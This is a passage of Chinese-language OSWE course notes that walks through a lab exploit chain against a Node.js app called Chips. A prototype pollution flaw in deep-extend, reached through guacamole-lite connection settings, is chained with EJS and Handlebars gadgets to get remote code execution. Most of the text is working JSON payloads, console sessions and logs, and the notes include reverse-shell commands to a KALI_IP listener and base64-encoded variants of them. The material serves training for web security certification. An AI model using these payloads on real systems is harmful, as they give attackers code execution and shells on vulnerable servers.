    "__proto__": {
        "toString": "foobar"
    }
  }    
}
```
> ![image](https://hackmd.io/_uploads/rJA5UWQyMx.png)\
> 結果沒有 crash 代表這一層 object 沒有進入 vulnerable merge

第二次測試將 payload 放 settings 內\
原因：settings 很常會跟 default settings merge\
![image](https://hackmd.io/_uploads/Sy1gPZmkMe.png)

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "toString": "breaking toString"
      }
    }
  }
}
```
> ![image](https://hackmd.io/_uploads/Bklmwb7JMx.png)\
> 瀏覽 /rdp?token=... 後，嘗試建立 RDP (uacamole-lite) connection, app crash\
> 代表 Node process 可能已 crash

檢查 logs
```
docker-compose -f ~/chips/docker-compose.yml logs chips
```
logs:
```
/usr/src/app/node_modules/moment/moment.js:28
            Object.prototype.toString.call(input) === '[object Array]'
                                      ^

TypeError: Object.prototype.toString.call is not a function
    at isArray (/usr/src/app/node_modules/moment/moment.js:28:39)
    at createLocalOrUTC (/usr/src/app/node_modules/moment/moment.js:3008:14)
    at createLocal (/usr/src/app/node_modules/moment/moment.js:3025:16)
    at hooks (/usr/src/app/node_modules/moment/moment.js:16:29)
    at ClientConnection.getLogPrefix (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:82:22)
    at ClientConnection.log (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:78:22)
    at /usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:44:18
    at Object.processConnectionSettings (/usr/src/app/node_modules/guacamole-lite/lib/Server.js:117:64)
    at new ClientConnection (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:37:26)
    at Server.newConnection (/usr/src/app/node_modules/guacamole-lite/lib/Server.js:149:59)
```
> Moment.js 呼叫 `Object.prototype.toString.call(input)`，但因為 `Object.prototype.toString = "breaking toString"` 所以 `Object.prototype.toString.call` 變成 undefined
>> 可以推測 settings object 很可能被 deep merge

### Whitebox Discovery
用 blackbox 可以確認：
```
POST /token
settings 裡放 __proto__.toString
    ↓
拿 token 去 /rdp
    ↓
application crash
```
whitebox 可以追 root cause\
先檢查主程式是否寫了 vulnerable merge:
Prototype Pollution 常出現在 `obj[key] = value`\
尤其是 `target[key]`, `source[key]`, `a[key] = b[key]`
透過 VScode 搜尋 `[` 或 `$begin:math:display$\[a\-zA\-Z0\-9\_\$\]\+$end:math:display$`\
![image](https://hackmd.io/_uploads/ryrjbGm1Ml.png)
> - webpack.config.js: 只是 build frontend
> - public/js/index.js: Webpack 產出的 client-side bundle
> - routes/index.js & routes/files.js: 雖然有 square bracket，但只是 array access 沒有 object merge
> > 主程式沒有明顯 prototype pollution sink

接著看第三方 library，NodeJS app 常見 prototype pollution 來源 node_modules (尤其是 merge/extend 類 library)\
列出 production dependencies
```
student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 1
Creating chips_chips_run ... done
app@0.0.0 /usr/src/app
...
+-- ejs@3.1.6
| `-- jake@10.8.2
+-- express@4.16.4
| +-- accepts@1.3.7
...
| +-- fresh@0.5.2
| +-- merge-descriptors@1.0.1
| +-- methods@1.1.2
...
| +-- type-is@1.6.18
| +-- utils-merge@1.0.1
| `-- vary@1.1.2
+-- guacamole-lite@0.6.3
| +-- deep-extend@0.4.2
| +-- moment@2.29.1
| `-- ws@1.1.5
....
```
> 其中 `merge-descriptors`, `utils-merge`, `deep-extend` 可疑 library

- [merge-descriptors](https://github.com/sindresorhus/merge-descriptors) & [utils-merge](https://github.com/jaredhanson/utils-merge)
通常是 shallow merge ，類似
```javascript
function badMerge(a,b) {
  for (var key in b) {
    a[key] = b[key];
  }
}
```
不 recursive 通常不會形成經典 prototype pollution
- [deep-extend](https://www.npmjs.com/package/deep-extend)
Document 明確寫著 Recursive object extending\
查看 `node_modules/deep-extend/lib/deep-extend.js`
```javascript
...
82  var deepExtend = module.exports = function (/*obj_1, [obj_2], [obj_N]*/) {
...
91    	var target = arguments[0];
94      var args = Array.prototype.slice.call(arguments, 1);
95
96      var val, src, clone;
97
98      args.forEach(function (obj) {
99         // skip argument if isn't an object, is null, or is an array
100         if (typeof obj !== 'object' || obj === null || Array.isArray(obj)) {
101                 return;
102         }
103
104         Object.keys(obj).forEach(function (key) {
105           src = target[key]; // source value
106           val = obj[key]; // new value
...
109           if (val === target) {
110              return;
...
116           } else if (typeof val !== 'object' || val === null) {
117              target[key] = val;
118              return;
...
136           } else {
137              target[key] = deepExtend(src, val);
138              return;
139           }
140         });
141      });
142
143      return target;
144  }
```
> - `Object.keys(obj).forEach(function (key) {`: 會遍歷  user-controlled key，若 key 是 `__proto__` 就會進入：
> ```javascript
> src = target[key];
> val = obj[key];
> ```

>[!Important]
>當 `key = "__proto__"` 時 = `target[key]`\
>等於 `target.__proto__` (target 的 prototype)

若 val 也是 object 就會走 recursive branch 
```javascript
target[key] = deepExtend(src, val);
```
實際等於：
```javascript
deepExtend(Object.prototype, attackerObject)
```
也可能
```javascript
deepExtend(SomeClass.prototype, attackerObject)
```

也能透過 npm audit 發現這個漏洞
```
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm audit

Creating chips_chips_run ... done

                       === npm audit security report ===

                                 Manual Review
             Some vulnerabilities require your attention to resolve

          Visit https://go.npm.me/audit-guide for additional guidance


  Low             Prototype Pollution

  Package         deep-extend

  Patched in      >=0.5.1

  Dependency of   guacamole-lite

  Path            guacamole-lite > deep-extend

  More info       https://npmjs.com/advisories/612


found 1 low severity vulnerability in 1071 scanned packages
  1 vulnerability requires manual review. See the full report for details.

ERROR: 1
```
> "guacamole-lite > deep-extend"

進一步找 deep-extend 被誰用: `node_modules/guacamole-lite/`
```
├── index.js
├── lib
│   ├── ClientConnection.js
│   ├── Crypt.js
│   ├── GuacdClient.js
│   └── Server.js
├── LICENSE
├── package.json
└── README.md
```
- node_modules/guacamole-lite/lib/Server.js
```javascript
001  const EventEmitter = require('events').EventEmitter;
002  const Ws = require('ws');
003  const DeepExtend = require('deep-extend');
004
005  const ClientConnection = require('./ClientConnection.js');
006
007  class Server extends EventEmitter {
008
009    constructor(wsOptions, guacdOptions, clientOptions, callbacks) {
...
034      DeepExtend(this.clientOptions, {
035        log: {
...
039        },
040
041        crypt: {
042          cypher: 'AES-256-CBC',
043        },
044
045        connectionDefaultSettings: {
046          rdp: {
047            'args': 'connect',
048            'port': '3389',
049            'width': 1024,
050            'height': 768,
051            'dpi': 96,
052          },
...
074        },
075
076        allowedUnencryptedConnectionSettings: {
...
103       }
104
105     }, clientOptions);
...
133   }
...
147   newConnection(webSocketConnection) {
148     this.connectionsCount++;
149     this.activeConnections.set(this.connectionsCount, new ClientConnection(this, this.connectionsCount, webSocketConnection));
150    }
151  }
152
153  module.exports = Server;
```
在檔案中發現 DeepExtend library 在 L3 被匯入，並且在 L34 被使用\
然而，它僅用於初始化 guacamole-lite 伺服器。當 client 端連線是由ClientConnection.js 處理 (L5 和 L149) 。當建立新連線時，ClientConnection.js 會被初始化，傳給 DeepExtend 的參數是在伺服器初始化時傳遞的 (使用者不可控)\
bin/www:
```www
...
10  const GuacamoleLite = require('guacamole-lite');
11  const clientOptions = require("../settings/clientOptions.json")
12  const guacdOptions = require("../settings/guacdOptions.json");
...
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions);
...
```
- node_modules/guacamole-lite/lib/ClientConnection.js
```javascript
001  const Url = require('url');
002  const DeepExtend = require('deep-extend');
003  const Moment = require('moment');
004 
005  const GuacdClient = require('./GuacdClient.js');
006  const Crypt = require('./Crypt.js');
007 
008  class ClientConnection {
009 
010    constructor(server, connectionId, webSocket) {
...
023
024      try {
025        this.connectionSettings = this.decryptToken();
...
029        this.connectionSettings['connection'] = this.mergeConnectionOptions();
030
031      } 
...
054    }
...
132    mergeConnectionOptions() {
...
140      let compiledSettings = {};
141
142      DeepExtend(
143        compiledSettings,
144        this.server.clientOptions.connectionDefaultSettings[this.connectionType],
145        this.connectionSettings.connection.settings,
146        unencryptedConnectionSettings
147      );
148
149      return compiledSettings;
150    }
...
159  }
...
```
> - Exploit path: `const DeepExtend = require('deep-extend');`
> - Root cause: `this.connectionSettings.connection.settings`來自 token decrypted content，而 token 就來自 POST /token (使用者可控)
> `this.connectionSettings.connection.settings` 也能解釋為什麼payload 要放 settings，只有這段被傳進 DeepExtend

## Prototype Pollution Exploitation
目前做到：
```
settings.__proto__
    ↓
deep-extend
    ↓
Object.prototype pollution
```
只造成 crash(DoS)，🥚 真正 exploitation 需要 gadget

Prototype Pollution 本身只是 primitive，可以把任意 property 放到 Object.prototype (`Object.prototype.isAdmin = true`)，但能不能變成漏洞，要看 application 是否有 `if (user.isAdmin) ...`，且 user object 本身沒有明確設定 `isAdmin: false`
```
user.isAdmin
    ↓
user object 自己有嗎？
    ↓
有 → 用自己的值
沒有 → 往 Object.prototype 找
```
Ex. 
![image](https://hackmd.io/_uploads/BkwAeQm1Gl.png)

```
> {}.__proto__.preface = "');console.log('RUNNING ANY CODE WE WANT')//"
"');console.log('RUNNING ANY CODE WE WANT')//"

> options = {"log": true}
{ log: true }

> runCode("console.log('Running some random code')", options)

RUNNING ANY CODE WE WANT
undefined
```
> options 物件中的 log key 被明確地設定為 true。然而，preface key 並沒有被明確地設定\
> 如果在設定 options 之前，將 payload 注入到 Object 原型中的 preface key，就可以執行任意 JavaScript 程式碼

RCE Gadget 的典型模式: 污染到會被拼進 code string 的 property
- eval(...)
- Function(...)
- vm.runInNewContext(...)
- child_process.exec(...)
- template compilation

在 Chips 中找 gadget
先看 direct production dependencies
```
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 0
Creating chips_chips_run ... done
app@0.0.0 /usr/src/app
+-- cookie-parser@1.4.5
+-- debug@2.6.9
+-- dockerode@3.2.1
+-- dotenv@8.2.0
+-- ejs@3.1.6
+-- express@4.16.4
+-- guacamole-lite@0.6.3
+-- hbs@4.1.1
+-- http-errors@1.6.3
+-- morgan@1.9.1
`-- pug@3.0.2
```
> - `dockerode`: 看起來像可能執行 Docker command
> - `ejs / hbs / pug`: Template engine 通常會把 template compile 成 JavaScript function

## EJS
嘗試使用 prototype pollution 使 application crash，確認伺服器運行 EJS，驗證完成後嘗試取得 RCE

三個 template engine:
```
EJS         ~1120 lines
Handlebars ~5142 lines
Pug         ~5853 lines
```
EJS 最簡單把 JavaScript 放進 template\
Pug 與 Handlebars 有自己的語法，要先 parse → compile → JS

### EJS - Proof of Concept
EJS 允許 `<%= foo %>`, `<% if(x) { %>`\
template → compile 成 JavaScript function\
非常接近 `eval()`, `new Function()`

[環境範例]\
使用 CLI Debug EJS
```
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> 
```
- 載入 EJS
```javascript
let ejs = require('ejs');
```
- compile()
```javascript
let template = ejs.compile(str, options);
template(data);
```
- render()
```javascript
ejs.render(str, data, options);
```
- render example
```javascript
let template = ejs.compile("Hello, <%= foo %>", {})
template({"foo":"world"})
```
👉🏻 "Hello, world"

進入 EJS source code:
`node_modules/ejs/lib/ejs.js`
```javascript
379  exports.compile = function compile(template, opts) {
380    var templ;
381  
382    // v1 compat
383    // 'scope' is 'context'
384    // FIXME: Remove this in a future version
385    if (opts && opts.scope) {
386      if (!scopeOptionWarned){
387        console.warn('`scope` option is deprecated and will be removed in EJS 3');
388        scopeOptionWarned = true;
389      }
390      if (!opts.context) {
391        opts.context = opts.scope;
392      }
393      delete opts.scope;
394    }
395    templ = new Template(template, opts);
396    return templ.compile();
```
> - `Template(template, opts)`: 
> ```javascript
> function Template(text, opts) {
>  opts = opts || {};
>
>  var options = {};
>
>  options.client = opts.client || false;
>
>  options.escapeFunction =
>      opts.escape ||
>      opts.escapeFunction ||
>      utils.escapeXML;
>
>  options.compileDebug =
>      opts.compileDebug !== false;
>
>  options.debug = !!opts.debug;
>}
> ```
> opts.escape 會從 prototype chain 找值

```
> o = {
...   "escape" : function (x) {
.....     console.log("Running escape");
.....     return x;
.....   }
... }
{ escape: [Function: escape] }

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o)
Running escape
'Hello, world'
```
> 利用上述說明的 toString 函數修改

嘗試用字串替換函數
```
> o = {"escape": "bar"}
{ escape: 'bar' }

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o)
Uncaught TypeError: esc is not a function
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18)
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), <anonymous>:15:3)
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17)
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37)
```
> 如預期跳 Error

Prototype Pollution 版本:
```
> {}.__proto__.escape = "haxhaxhax"
'haxhaxhax'

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, {})
Uncaught TypeError: esc is not a function
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18)
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), <anonymous>:15:3)
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17)
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37)
```
> `opts.escape` 從 prototype chain 繼承到 `Object.prototype.escape`
>> Blackbox fingerprint
>> (也可以得知 EJS template，不同 template engine 有不同 gadget)

在 Chips 中實際利用:\
![image](https://hackmd.io/_uploads/rkCJ0EX1fx.png)\
向/guaclite 送 request:\
![image](https://hackmd.io/_uploads/HJql0VmyMe.png)
> 回應顯示已切換到 WebSocket protocol,表示 token 已處理\
> 🥚 Application crush\
> ![image](https://hackmd.io/_uploads/ByXU0Nmkfl.png)

### EJS - Remote Code Execution
已確認 Prototype Pollution 可以影響 EJS options
👉🏻 把污染的 option 注入 EJS compiled JavaScript

EJS 流程：
```
let template = ejs.compile(str, options);
template(data);
```
嘗試將 payload 插進 compiled source 就能 RCE
```
template string
  ↓
轉成 JavaScript source code
  ↓
new Function(...)
  ↓
執行
```

關鍵 gadget：outputFunctionName\
(`node_modules/ejs/lib/ejs.js`)
```javascript
379  exports.compile = function compile(template, opts) {
380    var templ;
381  
382    // v1 compat
383    // 'scope' is 'context'
384    // FIXME: Remove this in a future version
385    if (opts && opts.scope) {
386      if (!scopeOptionWarned){
387        console.warn('`scope` option is deprecated and will be removed in EJS 3');
388        scopeOptionWarned = true;
389      }
390      if (!opts.context) {
391        opts.context = opts.scope;
392      }
393      delete opts.scope;
394    }
395    templ = new Template(template, opts);
396    return templ.compile();
397  };
```
Template.compile 函數定義在 L569
```javascript
569    compile: function () {
...
574      var opts = this.opts;
...
584      if (!this.source) {
585        this.generateSource();
586        prepended +=
587          '  var __output = "";\n' +
588          '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
589        if (opts.outputFunctionName) {
590          prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
591        }
...
609      }
```
> opts.outputFunctionName 會直接被拼進 JavaScript code
> 原始拼接 `var ${outputFunctionName} = __append;`
> > ` var x = 1; WHATEVER_JSCODE_WE_WANT ; y = __append;'`
```
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> ejs  = require("ejs")

> ejs.render("hello <% echo('world'); %>", {}, {outputFunctionName: 'echo'});
'hello world'
```
```
> ejs  = require("ejs")
...
> ejs.render("Hello, <%= foo %>", {"foo":"world"})
'Hello, world'

> {}.__proto__.outputFunctionName = "x = 1; console.log('haxhaxhax') ; y"
"x = 1; console.log('haxhaxhax') ; y"

> ejs.render("Hello, <%= foo %>", {"foo":"world"})
haxhaxhax
'Hello, world'
```
CLI 確認方法有效，接著建構 payload
```json
"__proto__":
{
    "outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
}
```
![image](https://hackmd.io/_uploads/SkgcMSmJMg.png)\
![image](https://hackmd.io/_uploads/ByU5GSmkMx.png)

檢查 Logs
```
chips_1     | root
chips_1     | 
chips_1     | root
chips_1     | 
chips_1     | root
chips_1     | 
chips_1     | GET / 200 32.799 ms - 4962
```
RCE Payload:
```json
{
  "__proto__": {
    "outputFunctionName": "x = 1; process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/KALI_IP/4444 0>&1\"'); y"
  }
}
```
> Kali: `nc -nvlp 4444`

Base64 RCE Payload:
```
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' | base64 -w0
```
```json
{
  "__proto__": {
    "outputFunctionName": "x = 1; process.mainModule.require('child_process').execSync('echo BASE64_PAYLOAD | base64 -d | bash'); y"
  }
}
```
## Handlebars
EJS 幾乎都是 HTML + JavaScript\
Handlebars 是自己的 template language

### Handlebars - Proof of Concept
環境範例切換到 hbs
```
docker-compose down
TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
```

Handlebars 編譯流程
```
template string
  ↓
Handlebars.parse()
  ↓
AST
  ↓
Compiler().compile()
  ↓
opcodes
  ↓
JavaScriptCompiler().compile()
  ↓
JavaScript source
  ↓
Handlebars.template()
  ↓
render function
```
handlebars AST
```
hello {{ foo }}
```
會被 parse 成：
```
Program
  ├── ContentStatement: "hello "
  └── MustacheStatement: "{{ foo }}"
```
- CLI 測試
```
Handlebars = require("handlebars")
ast = Handlebars.parse("hello {{ foo }}")
```
會看到：
```javascript
{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      value: 'hello '
    },
    {
      type: 'MustacheStatement',
      ...
    }
  ]
}
```

在 `node_modules/handlebars/dist/cjs/handlebars/compiler/base.js` 有：
```javascript
if (input.type === 'Program') {
  return input;
}
```
若 input.type 是 Program，Handlebars 會認為 input 已經是 AST
直接跳過 parser
> parse() 弱點

- Handlebars detection gadget：pendingContent

在 `compiler/javascript-compiler.js`
```javascript
appendContent: function appendContent(content) {
  if (this.pendingContent) {
    content = this.pendingContent + content;
  } else {
    this.pendingLocation = this.source.currentLocation;
  }

  this.pendingContent = content;
}
```
為什麼 pendingContent 可用？

如果污染 `Object.prototype.pendingContent = "haxhaxhax"`，那 this.pendingContent 會成立\
原本 template `hello {{ foo }}`\
會變 `haxhaxhaxhello student`

- CLI PoC
```javascript
Handlebars = require("handlebars")

ast = Handlebars.parse("hello {{ foo }}")

{}.__proto__.pendingContent = "haxhaxhax"

precompiled = Handlebars.precompile(ast)

eval("compiled = " + precompiled)

hello = Handlebars.template(compiled)

hello({"foo": "student"})
```
> 👉🏻 haxhaxhaxhello student

建構 HTTP Payload
```json
connection.settings.__proto__
```
Request:
```
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "pendingContent": "haxhaxhax"
      }
    }
  }
}
```

流程經過 `this.source.quotedString(this.pendingContent)`\
`quotedString()` 會被 escape：
```
replace(/\\/g, '\\\\')
replace(/"/g, '\\"')
replace(/\n/g, '\\n')
```
若注入 payload:
```
"; require('child_process').execSync('id'); //
```
只會變成字串，不會逃出 JavaScript string context

pendingContent 可以造成：
1. template fingerprint
2. content injection
3. HTML injection
4. XSS

但 pendingContent 無法 RCE

清除 pendingContent
```
delete Object.prototype.pendingContent
```

### Handlebars - Remote Code Execution
pendingContent 不能 RCE，所以要找另一個 gadget。

當前目標🎯：\
把污染值插入到 Handlebars generated JavaScript code 且不要被 escape

Key point：
```javascript
if (input.type === 'Program') {
  return input;
}
```
若污染 `Object.prototype.type = "Program"`\
即使 input 是普通字串：`"hello {{ foo }}"`\
也會被 Handlebars 誤認為已經是 AST
但只設 type 會 crash、加 body 可以 precompile，但結果是空 template

⚠️：需要自己構造 AST body
塞入一個 `MustacheStatement` 並且在 params 裡塞 `NumberLiteral`\
因為 NumberLiteral 會走 `pushLiteral(value)` 不是 escaped string

Handlebars AST 中：
```javascript
{
  type: 'NumberLiteral',
  value: 12345
}
```
precompile 後會直接變成 `..., 12345, ...` 沒有 quote

🧠：如果把 value 改成：
```
console.log('haxhaxhax')
```
產生的 code 會變：
```
..., console.log('haxhaxhax'), ...
```
👉🏻 code execution

- CLI 測試 NumberLiteral
```javascript
Handlebars = require("handlebars")

ast = Handlebars.parse('{{someHelper "some string" 12345 true undefined null}}')

ast.body[0].params[1].value = "console.log('haxhaxhax')"

precompiled = Handlebars.precompile(ast)

eval("compiled = " + precompiled)

tem = Handlebars.template(compiled)

tem({})
```
顯示：
```
haxhaxhax
Missing helper: "someHelper"
```
> 後面錯但 payload 已執行

- 最小 AST Injection Payload
```javascript
Object.prototype.type = "Program"
Object.prototype.body = [
  {
    type: "MustacheStatement",
    path: 0,
    loc: 0,
    params: [
      {
        type: "NumberLiteral",
        value: "console.log('haxhaxhax')"
      }
    ]
  }
]
```

Final RCE Payload:
放 `connection.settings.__proto__`
```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "type": "Program",
        "body": [
          {
            "type": "MustacheStatement",
            "path": 0,
            "loc": 0,
            "params": [
              {
                "type": "NumberLiteral",
                "value": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())"
              }
            ]
          }
        ]
      }
    }
  }
}
```
Exploit flow
```
POST /token
  ↓
取得 encrypted token
  ↓
GET /guaclite?token=<TOKEN>
  ↓
deep-extend 污染 Object.prototype
  ↓
GET /
  ↓
Handlebars parse/precompile
  ↓
input.type 從 Object.prototype 取得 Program
  ↓
Handlebars 使用污染的 body 當 AST
  ↓
NumberLiteral.value 被插入 generated JS
  ↓
child_process.execSync('whoami')
```
檢查 docker-compose log：
```
root
root
GET / 500 ...
Error: Missing helper: "undefined"
```

- Reverse Shell Payload
(Kali)
```
nc -nvlp 4444
```
建議用 base64 避免 quote 問題：
```
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' | base64 -w0
```
把 value 改成：
```
"value": "process.mainModule.require('child_process').execSync('echo BASE64_PAYLOAD | base64 -d | bash')"
```
```
"__proto__": {
  "type": "Program",
  "body": [
    {
      "type": "MustacheStatement",
      "path": 0,
      "loc": 0,
      "params": [
        {
          "type": "NumberLiteral",
          "value": "process.mainModule.require('child_process').execSync('echo BASE64_PAYLOAD | base64 -d | bash')"
        }
      ]
    }
  ]
}
```
環境範例使用 `NumberLiteral`\
但其他沒有 escape、會走 pushLiteral() 的也可能：
```
BooleanLiteral
UndefinedLiteral
NullLiteral
```
> `NumberLiteral` / `BooleanLiteral` 實務上最好用
>> 有可控 value

StringLiteral 走 `pushString()` 不適合，會 escape

>[!Important]
>**AST Injection via Prototype Pollution**\
>也是 server-side prototype pollution 中最經典的 RCE 路徑之一

# Dolibarr Eval Filter Bypass RCE
>[!Caution]
> HackMD 筆記長度限制，接續 [[OSWE, WEB-300] Instructional notes - Part 6](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-6/)

# [Link to: "[OSWE, WEB-300] Instructional notes - Part 6"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-6/)
